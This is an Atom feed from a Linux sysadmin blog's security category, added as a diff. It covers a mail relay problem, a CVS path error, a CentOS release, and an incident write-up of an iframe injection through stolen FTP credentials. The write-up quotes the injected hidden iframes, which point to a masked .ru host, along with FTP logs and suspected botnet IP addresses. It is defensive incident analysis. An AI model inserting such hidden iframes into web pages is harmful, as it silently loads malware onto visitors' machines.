@@ -1,0 +1,121 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: Security | Linux Sysadmin Blog]]></title>
+  <link href="http://linuxsysadminblog.com/category/security/atom.xml" rel="self"/>
+  <link href="http://linuxsysadminblog.com/"/>
+  <updated>2012-11-13T01:37:44+08:00</updated>
+  <id>http://linuxsysadminblog.com/</id>
+  <author>
+    <name><![CDATA[Promet OPS Team]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Drupalcon Security Session Notes]]></title>
+    <link href="http://linuxsysadminblog.com/2010/04/drupalcon-security-session-notes/"/>
+    <updated>2010-04-19T17:27:19+08:00</updated>
+    <id>http://linuxsysadminblog.com/2010/04/drupalcon-security-session-notes</id>
+    <content type="html"><![CDATA[
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Mail Relay Issue on Cpanel Server]]></title>
+    <link href="http://linuxsysadminblog.com/2010/02/mail-relay-issue-on-cpanel-server/"/>
+    <updated>2010-02-16T09:05:00+08:00</updated>
+    <id>http://linuxsysadminblog.com/2010/02/mail-relay-issue-on-cpanel-server</id>
+    <content type="html"><![CDATA[<p>I noticed lots of email being relayed on one of our shared hosting server, CentOS5 with Cpanel and running Exim, and the strange thing is that the email server (MX) for these accounts are pointing to Google (GoogleApps), and we have correct entries for <em>localdomains</em> and <em>remotedomains</em> for these account.  The relayers (<em>'From'</em> server/address) looks like spam anyway.  From the mail logs I noticed that the relayed messages have '<em>fixed_login</em>' and key ('<em>rsa-sha1</em>') for their authentications.</p>
+
+<p>Since the mail server for these accounts are pointing to other servers, I deleted all the email accounts, forwarders, mailinglists, etc.  After this I've seen sending error/failure messages from mail logs of the said accounts  It shows '<em>fixed_login authenticator failed for hostxx' [535 Incorrect authentication data]</em>.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[cvs [checkout aborted]: absolute pathnames invalid for server]]></title>
+    <link href="http://linuxsysadminblog.com/2010/02/cvs-checkout-aborted-absolute-pathnames-invalid-for-server/"/>
+    <updated>2010-02-03T04:44:00+08:00</updated>
+    <id>http://linuxsysadminblog.com/2010/02/cvs-checkout-aborted-absolute-pathnames-invalid-for-server</id>
+    <content type="html"><![CDATA[<p>Absolute Path Error:
+<code>
+cvs [checkout aborted]: absolute pathnames invalid for server (specified `/path/drupalsite/')
+</code></p>
+
+<p>Ok, I got the error above when I performed Drupal CVS update on our Debian server (newly installed CVS 1.12.13).  The same command works on other server with older CVS installation.  The issue is the reference to local cvs directory where I used absolute path (-d /path/drupalsite/), which is a bug (security hole on client side) - it was fixed on newer CVS version to use relative path.</p>
+
+<p>Drupal Checkout Command:
+<code>
+cvs -z6 -d:pserver:anonymous:anonymous@cvs.drupal.org:/cvs/drupal co -r DRUPAL-6-15 -d /path/drupalsite/ drupal
+</code></p>
+
+<p>Use of Relative Path (sample)
+<code>
+cd /path
+cvs -z6 -d:pserver:anonymous:anonymous@cvs.drupal.org:/cvs/drupal co -r DRUPAL-6-15 -d drupalsite drupal
+</code></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Iframe injection attack investigation]]></title>
+    <link href="http://linuxsysadminblog.com/2009/09/iframe-injection-attack-investigation/"/>
+    <updated>2009-09-21T15:17:56+08:00</updated>
+    <id>http://linuxsysadminblog.com/2009/09/iframe-injection-attack-investigation</id>
+    <content type="html"><![CDATA[<p>The whole hidden IFRAME vulnerability has been going on for some time, only a few of our client have been effected by this. The net is still buzzing with this issue and while some are saying that the injection are results of php insecurities, mysql injection or cross site scripting, while others point to key loggers and hijacked ftp credentials. In our case the exploit was not due to an application vulnerability but rather to hijacked ftp login information. Brute force password guessing attacks were not performed on this account nor any other accounts on the same server. In this particular type of attack, at the very end of index.php/index.html an IFRAME statement was appended overwriting page closing tags.</p>
+
+<p><code>
+iframe src="http://***.ru:8080/index.php" width=111 height=162 style="visibi
+iframe src="http://***.ru:8080/index.php" width=136 height=162 style="visibility: hidden" /iframe
+iframe src="http://***.ru:8080/index.php" width=141 height=156 style="visibility: hidden" /iframe
+</code></p>
+
+<p>Some of the index.php files had multiple IFRAME statements appended to the end. Knowing the username of affected account and affected filename I searched in /var/log/messages for any related entries and hit jackpot:</p>
+
+<p><code>
+Aug 27 01:27:59 web152 pure-ftpd: (?@94.218.69.243) [INFO] user is now logged in
+Aug 27 01:28:00 web152 pure-ftpd: (user@94.218.69.243) [NOTICE] /home/user//public_html/index.php downloaded  (2311 bytes, 1001.70KB/sec)
+Aug 27 01:28:00 web152 pure-ftpd: (user@94.218.69.243) [INFO] Logout.
+Aug 27 01:28:04 web152 pure-ftpd: (?@78.92.144.185) [INFO] user is now logged in
+Aug 27 01:28:05 web152 pure-ftpd: (user@78.92.144.185) [NOTICE] /home/user//public_html/index.php uploaded  (2353 bytes, 10.42KB/sec)
+Aug 27 01:28:05 web152 pure-ftpd: (user@78.92.144.185) [INFO] Logout.
+</code></p>
+
+<p>What's interesting to note here is that even though downloading/uploading of index.php happens within a 6 second window, the source ip address for download and upload are not the same. During the next few days the same file is downloaded and uploaded but never from the same set of ip addresses. During the few days that I was allowing this to happen as I was monitoring said activity and collecting the IP addresses to see if a pattern emerges:</p>
+
+<p><code>
+83.82.57.39 GeoIP Country Edition: NL, Netherlands
+95.52.163.74 GeoIP Country Edition: RU, Russian Federation
+189.122.164.40 GeoIP Country Edition: BR, Brazil
+69.159.47.21 GeoIP Country Edition: CA, Canada
+85.221.184.164 GeoIP Country Edition: PL, Poland
+98.243.198.220 GeoIP Country Edition: US, United States
+78.30.154.22 GeoIP Country Edition: RS, Serbia
+77.81.33.229 GeoIP Country Edition: RO, Romania
+83.6.73.91 GeoIP Country Edition: PL, Poland
+190.198.3.27 GeoIP Country Edition: VE, Venezuela
+75.208.130.92 GeoIP Country Edition: US, United States
+68.84.202.157 GeoIP Country Edition: US, United States
+75.80.81.104 GeoIP Country Edition: US, United States
+</code></p>
+
+<p>Seeing that no clear pattern is evident here and considering that the IP address was different for each connection it is my rationale that the computer's at these IP addresses were a part of a botnet. My assumption is that a developer had saved the account password and was infected by malicious software which was able to gather the ftp credentials.</p>
+
+<p>Cleanup included restoring files and changing all account/ftp/email and database passwords.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[CentOS 4.8 finally released!]]></title>
+    <link href="http://linuxsysadminblog.com/2009/09/centos-4-8-finally-released/"/>
+    <updated>2009-09-01T05:03:36+08:00</updated>
+    <id>http://linuxsysadminblog.com/2009/09/centos-4-8-finally-released</id>
+    <content type="html"><![CDATA[<p>After a long development time, <strong>Centos 4.8</strong> was finally <a href="http://lists.centos.org/pipermail/centos-announce/2009-August/016106.html">released</a> on the 21st August. This is a good thing that after the latest <a href="http://www.centos.org/modules/news/article.php?storyid=381">problems</a> between the centos developers, they were able to pull this out finally and now be able to focus on the upcoming 5.4 release.</p>
+
+<p>There are no major <a href="http://www.centos.org/docs/4/4.8/release_notes/">changes</a> in this update, mostly <em>bug fixes and security fixes</em>, and it should be a quick and easy upgrade for most people still running the 4.x branch (you should really consider comments: true
+upgrading to 5.x ;) ).</p>
+]]></content>
+  </entry>
+  
+</feed>
